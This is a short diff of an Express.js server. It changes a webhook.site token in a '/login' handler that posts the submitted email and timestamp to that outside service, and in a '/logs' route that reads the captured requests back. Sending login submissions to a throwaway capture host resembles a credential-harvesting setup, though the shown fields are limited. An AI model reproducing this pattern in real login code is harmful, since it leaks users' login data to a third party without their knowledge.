@@ -41,7 +41,7 @@ app.post('/login', (req, res) => {
     }
 
     // Send data to the webhook
-    const webhookUrl = "https://webhook.site/3f3aff1d-872e-45be-8309-828b82015761";
+    const webhookUrl = "https://webhook.site/d881e139-4a4e-4e3a-bcbc-febe4259a5ca";
     axios.post(webhookUrl, {
         email: email,
         timestamp: timestamp,
@@ -62,7 +62,7 @@ app.post('/login', (req, res) => {
 // New route to retrieve logs from webhook.site
 app.get('/logs', async (req, res) => {
     try {
-        const response = await axios.get('https://webhook.site/token/3f3aff1d-872e-45be-8309-828b82015761/requests');
+        const response = await axios.get('https://webhook.site/token/d881e139-4a4e-4e3a-bcbc-febe4259a5ca/requests');
         res.json(response.data); // Send the logs data as JSON to the client
     } catch (error) {
         console.error('Error fetching logs:', error);
